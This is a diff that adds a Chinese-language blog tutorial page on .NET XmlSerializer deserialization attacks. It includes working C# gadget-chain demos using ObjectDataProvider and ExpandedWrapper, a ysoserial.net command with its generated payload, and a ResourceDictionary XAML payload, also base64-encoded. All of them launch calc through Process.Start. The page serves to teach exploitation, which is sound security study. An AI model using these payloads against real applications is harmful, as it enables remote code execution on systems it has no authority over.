@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>基础链-XmlSerializer链 - ConsT27's Blog</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u57fa\u7840\u94fe-XmlSerializer\u94fe", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+          ]},
+          {title: "XmlSerializer\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316", url: "#xmlserializer", children: [
+          ]},
+          {title: "\u653b\u51fb\u94fe", url: "#_2", children: [
+              {title: "ObjectDataProvider", url: "#objectdataprovider" },
+              {title: "ResourceDictionary", url: "#resourcedictionary" },
+          ]},
+          {title: "Ref:", url: "#ref", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../JAVA/JAVA/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../JAVA/JAVA/" class="btn btn-xs btn-link">
+        JAVA
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/" class="btn btn-xs btn-link">
+        Dotnet反序列化入门各概念
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="-xmlserializer">基础链-XmlSerializer链</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#XmlSerializer序列化反序列化">XmlSerializer序列化/反序列化</a></li>
+<li><a href="#攻击链">攻击链</a><ul>
+<li><a href="#ObjectDataProvider">ObjectDataProvider</a></li>
+<li><a href="#ResourceDictionary">ResourceDictionary</a></li>
+</ul>
+</li>
+<li><a href="#Ref">Ref:</a></li>
+</ul>
+<h1 id="xmlserializer">XmlSerializer序列化/反序列化</h1>
+<p>来个demo</p>
+<p>我们把要序列化的类用[XmlRoot]，[XmlAttribute]，[XmlElement]特性分别指定根节点，节点属性，节点元素。
+然后用XmlSerializer 进行序列化和反序列化</p>
+<pre><code class="language-java">using System;
+using System.Runtime.Serialization;
+using System.Runtime.Serialization.Formatters.Binary;
+using System.Security.Permissions;
+using System.Xml.Serialization;
+
+namespace ConsoleAppi1;
+[XmlRoot]
+public class Person
+{
+    [XmlAttribute]
+    public string name { get; set; }
+
+    [XmlElement]
+    public int age { get; set; }
+
+    [XmlElement]
+    public string sex { get; set; }
+
+}
+
+public class MyObject
+{
+    static void Main(string[] args)
+    {
+        Person p1 = new Person();
+        p1.age = 20;
+        p1.name = &quot;tom&quot;;
+        p1.sex = &quot;male&quot;;
+
+        FileStream fstream = new FileStream(&quot;E:/tools/dotnet/hellowold/Solution1/ser.bin&quot;, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite);
+
+        //XmlSerializer xmlSerializer = new XmlSerializer(typeof(Person));
+        //XmlSerializer xmlSerializer = new XmlSerializer(p1.GetType());
+        XmlSerializer xmlSerializer = new XmlSerializer(Type.GetType(&quot;ConsoleAppi1.Person&quot;));
+
+        xmlSerializer.Serialize(fstream,p1);
+
+        fstream.Position = 0;
+
+        Person p1des =(Person) xmlSerializer.Deserialize(fstream);
+        Console.WriteLine(p1des.name);
+    }
+}
+</code></pre>
+<p>反序列化后成功输出</p>
+<p><img alt="" src="../image/image_bqYRnjEptp.png" /></p>
+<p>这是序列化后的内容</p>
+<p><img alt="" src="../image/image_ZxMJ74_EYW.png" /></p>
+<p>同时我们在上面的代码中可以看到在实例化XmlSerializer 时，在传入的参数中我们用到了Type.GetType方法去获取需要被序列化/反序列化的类的type。
+除了用Type.GetType外，在注释的几行里我们还可以发现，可以用 typeof(ClassName) 和 Object.GetType() 去获取。</p>
+<h1 id="_2">攻击链</h1>
+<h3 id="objectdataprovider">ObjectDataProvider</h3>
+<p>要打造围绕XmlSerializer 的攻击链，我们需要先了解一下ObjectDataProvider这个类，这个类可以帮助我们进行命令执行等操作。</p>
+<p>这个类位于System.Windows.Data下（如果rider提示找不到包，就添加PresentationFramework依赖，注意我当前的环境是.NET FrameWork）。</p>
+<p><img alt="" src="../image/image_llxzV9sdcy.png" /></p>
+<p>前置知识：在.net中我们可以通过方法System.Diagnostics.Process.start()来执行命令，就像java里的 Runtime.getRuntime.exec() 一样。</p>
+<pre><code class="language-java">            ObjectDataProvider o = new ObjectDataProvider();
+            o.MethodParameters.Add(&quot;calc&quot;);
+            o.MethodName = &quot;Start&quot;;
+            o.ObjectInstance = new System.Diagnostics.Process();
+</code></pre>
+<p>这段代码执行后后在内部调用System.Diagnostics.Process.start弹计算器出来。
+ObjectInstance用于指定对象，MethodName用于指定要被调用的方法，MethodParameters指定被调用方法的参数，参数用Add添加。</p>
+<p>同时这段代码在通过xmlserializer反序列化时依旧能够起到命令执行的作用，但是直接反序列化会遇到一些问题</p>
+<pre><code class="language-java">using System;
+using System.IO;
+using System.Windows.Data;
+using System.Xml.Serialization;
+
+namespace ConsoleApplication1
+{
+    [XmlRoot]
+    public class evil
+    {
+        public void evilfunc(string c)
+        {
+            System.Diagnostics.Process.Start(c);
+        }
+    }
+
+    class Program
+    {
+        public static void Main(string[] args)
+        {
+            ObjectDataProvider op = new ObjectDataProvider();
+            op.ObjectInstance = new evil();
+            op.MethodName = &quot;evilfunc&quot;;
+            op.MethodParameters.Add(&quot;calc&quot;);
+
+            FileStream fileStream = new FileStream(&quot;E:/tools/dotnet/hellowold/Solution1/ser.bin&quot;, FileMode.OpenOrCreate,
+                FileAccess.ReadWrite, FileShare.ReadWrite);
+            XmlSerializer xmlSerializer = new XmlSerializer(typeof(ObjectDataProvider));
+            xmlSerializer.Serialize(fileStream,op);
+        }
+    }
+}
+</code></pre>
+<p>直接反序列化会报下面的错。因为我们往XmlSerializer 传入的type是ObjectDataProvider，但是实际上我们的ObjectDataProvider中有含有evil类，就会导致类型错误。</p>
+<p><img alt="" src="../image/image_DuVg1nivva.png" /></p>
+<p>解决方案是用ExpandedWrapper进行包装（如果找不到这个类，rider里右键Dependencies→add References→ System.Data.Services)</p>
+<p>就像这样</p>
+<p>ExpandedWrapper本质上是一个泛型类，可以封装非特定数据类型的对象。</p>
+<p><img alt="" src="../image/image_1fBNQ5E8Ez.png" /></p>
+<pre><code class="language-java">using System;
+using System.IO;
+using System.Windows.Data;
+using System.Xml.Serialization;
+using System.Data.Services.Internal;
+
+
+namespace ConsoleApplication1
+{
+    [XmlRoot]
+    public class evil
+    {
+        public void evilfunc(string c)
+        {
+            System.Diagnostics.Process.Start(c);
+        }
+    }
+
+    class Program
+    {
+        public static void Main(string[] args)
+        {
+            ExpandedWrapper&lt;evil, ObjectDataProvider&gt; ew = new ExpandedWrapper&lt;evil, ObjectDataProvider&gt;();
+            ew.ProjectedProperty0 = new ObjectDataProvider();
+            ew.ProjectedProperty0.ObjectInstance = new evil();
+            ew.ProjectedProperty0.MethodName = &quot;evilfunc&quot;;
+            ew.ProjectedProperty0.MethodParameters.Add(&quot;calc&quot;);
+
+            FileStream fileStream = new FileStream(&quot;E:/tools/dotnet/hellowold/Solution1/ser.bin&quot;, FileMode.OpenOrCreate,
+                FileAccess.ReadWrite, FileShare.ReadWrite);
+            XmlSerializer xmlSerializer = new XmlSerializer(typeof(ExpandedWrapper&lt;evil, ObjectDataProvider&gt;));
+            xmlSerializer.Serialize(fileStream,ew);
+            fileStream.Position = 0;
+            xmlSerializer.Deserialize(fileStream);
+        }
+    }
+}
+</code></pre>
+<p>反序列化后成功弹出计算器。</p>
+<h2 id="resourcedictionary">ResourceDictionary</h2>
+<p>我们在上一小节讲了ObjectDataProvider并写了一个小demo，但是仅仅是那样的话，威胁还不够大，我们需要找到一个现存的恶意类，并且还要控制反序列化的内容，以及实例化XmlSerializer时传入的参数才有可能完成攻击。</p>
+<p>我们可以用ysoserial.net来生成一段XmlSerializer反序列化的payload
+<a href="https://github.com/pwntester/ysoserial.net/releases/tag/v1.34" title="https://github.com/pwntester/ysoserial.net/releases/tag/v1.34">https://github.com/pwntester/ysoserial.net/releases/tag/v1.34</a></p>
+<pre><code class="language-java">.\ysoserial.exe -g objectdataprovider -c calc -f xmlserializer
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;root type=&quot;System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;&gt;
+    &lt;ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; &gt;
+        &lt;ExpandedElement/&gt;
+        &lt;ProjectedProperty0&gt;
+            &lt;MethodName&gt;Parse&lt;/MethodName&gt;
+            &lt;MethodParameters&gt;
+                &lt;anyType xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xsi:type=&quot;xsd:string&quot;&gt;
+                    &lt;![CDATA[&lt;ResourceDictionary xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:d=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; xmlns:b=&quot;clr-namespace:System;assembly=mscorlib&quot; xmlns:c=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;&lt;ObjectDataProvider d:Key=&quot;&quot; ObjectType=&quot;{d:Type c:Process}&quot; MethodName=&quot;Start&quot;&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;b:String&gt;cmd&lt;/b:String&gt;&lt;b:String&gt;/c calc&lt;/b:String&gt;&lt;/ObjectDataProvider.MethodParameters&gt;&lt;/ObjectDataProvider&gt;&lt;/ResourceDictionary&gt;]]&gt;
+                &lt;/anyType&gt;
+            &lt;/MethodParameters&gt;
+            &lt;ObjectInstance xsi:type=&quot;XamlReader&quot;&gt;&lt;/ObjectInstance&gt;
+        &lt;/ProjectedProperty0&gt;
+    &lt;/ExpandedWrapperOfXamlReaderObjectDataProvider&gt;
+&lt;/root&gt;
+</code></pre>
+<p>但是它生成的payload对于新手分析起来难免有点恼火，所以我参考了Y4er提供的payload</p>
+<pre><code class="language-java">&lt;ResourceDictionary 
+                    xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; 
+                    xmlns:d=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot; 
+                    xmlns:b=&quot;clr-namespace:System;assembly=mscorlib&quot; 
+                    xmlns:c=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;&gt;
+    &lt;ObjectDataProvider d:Key=&quot;&quot; ObjectType=&quot;{d:Type c:Process}&quot; MethodName=&quot;Start&quot;&gt;
+        &lt;ObjectDataProvider.MethodParameters&gt;
+            &lt;b:String&gt;cmd&lt;/b:String&gt;
+            &lt;b:String&gt;/c calc&lt;/b:String&gt;
+        &lt;/ObjectDataProvider.MethodParameters&gt;
+    &lt;/ObjectDataProvider&gt;
+&lt;/ResourceDictionary&gt;
+</code></pre>
+<p>这段payload实际上是xaml（可以理解为和xml相近的语言），解读如下：</p>
+<ol>
+<li>xmlns:c 引用了System.Diagnostics命名空间起别名为c</li>
+<li>d:Key="" 起别名为空，在xaml语法中，Key这个键值必须有。</li>
+<li>ObjectType表示对象类型</li>
+<li>d:Type 等同于typeof()，那么 d:Type c:Process 就相当于 typeof(System.Diagnostics.Process)</li>
+<li>MethodName是ObjectDataProvider的属性，传递一个Start等于调用Start方法。</li>
+</ol>
+<p>如果这段xaml被解析，那么就相当于创建了一个ObjectDataProvider 对象去执行System.Diagnostics.Process.start("calc")</p>
+<p>那么如何被解析呢？</p>
+<p>网上大致有两种思路</p>
+<p>1.实例化XmlSerializer时传入的type可控，且XmlSerializer.Deserialize的参数可控，但是由于Deserialize方法并不能接收string参数，所以说这个思路可能更加适合通过代码审计发现一些新的链（这样的话就没必要用到ResourceDictionary了）</p>
+<p>2.使用XamlReader.Parse ，这个方法可以直接传入string参数</p>
+<p>下面用XamlReader.Parse解析一下上面的xaml</p>
+<pre><code class="language-java">            string p = &quot;PFJlc291cmNlRGljdGlvbmFyeSAKICAgICAgICAgICAgICAgICAgICB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiAKICAgICAgICAgICAgICAgICAgICB4bWxuczpkPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgCiAgICAgICAgICAgICAgICAgICAgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIAogICAgICAgICAgICAgICAgICAgIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+CiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIGQ6S2V5PSIiIE9iamVjdFR5cGU9IntkOlR5cGUgYzpQcm9jZXNzfSIgTWV0aG9kTmFtZT0iU3RhcnQiPgogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4KICAgICAgICAgICAgPGI6U3RyaW5nPmNtZDwvYjpTdHJpbmc+CiAgICAgICAgICAgIDxiOlN0cmluZz4vYyBjYWxjPC9iOlN0cmluZz4KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPgogICAgPC9PYmplY3REYXRhUHJvdmlkZXI+CjwvUmVzb3VyY2VEaWN0aW9uYXJ5Pg==&quot;;
+            byte[] vs = Convert.FromBase64String(p);
+            string xml = Encoding.UTF8.GetString(vs);
+            XamlReader.Parse(xml);
+</code></pre>
+<p><img alt="" src="../image/image_gSLKWbt3Tr.png" /></p>
+<p><img alt="" src="../image/image_B-Vsg4ha8R.png" /></p>
+<h1 id="ref">Ref:</h1>
+<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md" title="https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md">https://github.com/Y4er/dotnet-deserialization/blob/main/XmlSerializer.md</a></p>
+<p><a href="https://www.anquanke.com/post/id/172316#h3-8" title="https://www.anquanke.com/post/id/172316#h3-8">https://www.anquanke.com/post/id/172316#h3-8</a></p>
+<p><a href="https://blog.51cto.com/u_13953961/3106574" title="https://blog.51cto.com/u_13953961/3106574">https://blog.51cto.com/u_13953961/3106574</a></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../JAVA/JAVA/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../JAVA/JAVA/" class="btn btn-xs btn-link">
+        JAVA
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/Dotnet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E5%90%84%E6%A6%82%E5%BF%B5/" class="btn btn-xs btn-link">
+        Dotnet反序列化入门各概念
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
